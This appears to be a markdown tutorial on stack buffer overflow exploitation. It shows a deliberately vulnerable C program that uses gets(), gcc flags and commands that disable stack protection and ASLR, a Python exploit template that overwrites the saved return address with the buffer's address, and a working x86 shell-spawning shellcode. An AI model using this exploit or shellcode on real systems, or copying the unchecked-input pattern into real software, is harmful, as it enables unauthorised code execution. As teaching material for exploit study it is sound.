# EXPLOITS
## STACK BUFFER OVERFLOW FOR SHELLCODE INJECTION AND EXECUTION
## REQUIRED TO UNDERSTAND : Stack buffer overflow to overwrite registers backups especially to redirect code execution
## Doesn't work if : 
```
NX is enabled
```
## Bypasses protection : 
```
Umm, no protection
```
Okay, how to execute shellcode from a program ??  
We could just place the shellcode in a buffer then jump to the buffer
We have this type of code here :
```c
#include <stdio.h>
...
void <function> //Use another function than main() !!!
{
	char buffer[<BUFFER SIZE>];
	gets(buffer); 
	//I'm not using scanf() because it stops at bad chars, doesn't mean that it can't be overflowed but to keep things simple let's use gets() 
	//(of course it could be another way to create an exploitable stack buffer overflow)
}
...
void main()
{
	...
	<function>();
	...
}
```
So what do we have to modify here ? Well the goal is to place shellcode we want to execute in the buffer then jump to it as well
Basicaly to jump to the stack we have to redirect code execution to set the Instruction Pointer (RIP, EIP or IP) backup to the address of the buffer
There could be another ways to get the buffer address but just to stay simple i'm going to print it then it will be easier to exploit :
```c
#include <stdio.h>
...
void <function> //Use another function than main() !!!
{
	char buffer[<BUFFER SIZE>];
	gets(buffer); 
	//I'm not using scanf() because it stops at bad chars, doesn't mean that it can't be overflowed but to keep things simple let's use gets() 
	//(of course it could be another way to create an exploitable stack buffer overflow)
	printf("Address of buffer : %p\n", buffer); //You could also use gdb to find this but the problem with this debugger is that address are shifted with and without gdb so it will be very annoying to find the address
}
...
void main()
{
	...
	<function>();
	...
}
```
To compile it, you will have to make the stack executable :
```
gcc <source code file.c> -o <executable> -fno-stack-protector -z execstack -m32
```
I also added -m32 flag to compile in 32 bits, it's not required, but it makes exploitation easier, also note that if you compile in 32 bits, you wouldn't be able to execute 64 bits shellcode  
You should also disable ASLR otherwise, the address of the buffer wouldn't be static anymore :
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Or to disable ALSR for the program only :
```bash
setarch `uname -m` -R <executable>
# When you wanna pipe the exploit : python exploit.py | setarch `uname -m` -R <executable>
```

Awesome ! Now let's write the exploit (here i'm using python)
```python
import struct # To convert hex addresses to ascii using struct.pack()
# First we define the shellcode we're gonna inject to the program
shellcode = <Your shellcode> 
# Warning : DON'T USE SHELLCODE WHICH IS BIGGER THAN THE BUFFER SIZE !!! SO if <BUFFER SIZE> = 64 bytes, don't use a shellcode which is longer than 64 bytes (a byte is a character or a binary instruction)
# Example : this one will close the program in ELF32 "\xB8\x01\x00\x00\x00\xBB\x04\x00\x00\x00\xCD\x80"

# Then, we start the payload :
payload = shellcode + '\x90'*(<BUFFER SIZE> - len(shellcode)) 
# Okay, you're maybe confused about what i'm doing here, actually it's simple, first, i put my shellcode in the buffer and just to be sure that the program will not execute bad instructions, i fill all the rest of the buffer with the instruction 0x90 which is actually the NOP insrtruction, which just does nothing, so if the buffer size is 64 bytes and the shellcode is 12 bytes then it will put the shellcode and add 64 - 12 NOPs after it to fill the rest of the buffer

# Okay, now come the offset before overwriting Instruction Pointer, if you don't know how to do this, please see the article about code execution redirection by overwriting instruction pointer backup in the stack (here it's 64 (buffer) + 12 = 76)
payload += "X"*8 # I don't know what i'm overwriting here but it doesn't matter, may differ for you, just have to find the good offset exactly before overwriting the instruction pointer backup
payload += "B"*4 # EBP backup

# Now the instruction pointer backup that we will set to the address of the buffer :
payload += struct.pack("I", <buffer address>) # It's "Q" instead of "I" in 64 bits
# I did already say it before but the buffer address is printed in this case, but it could be not

# All is ready ! Now print the exploit payload :
print(payload)
```
The code is fair enough so i don't have to explain
Now to use the exploit :
```bash
python exploit.py | ./vuln
# If for example you used the shellcode that exits the program and you don't get a segmentation fault, it means that it worked
# If you used a shellcode to spawn a shell and it doesn't work it's either that it gives a segmentation fault without opening anything or it actually opens the shell but closing it, to solve this problem you can use this command :
(python exploit.py ; cat) | ./vuln
```

Exemple shellcode in x86 ELF, it will spawn a shell ! :
```python
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80" 
```
Hope that it works, if you have any problems, please ask them here, on github, i personally spent 10 hours having a problem related to the fact that the instruction pointer was overwrote with shellcode, but i was using a different type of exploit, in theory, this will work

But... What if the stack is not executable ?...  
How can we get a shell...  
You should look at ret2libc that is an exploitation technique which can bypass NX !
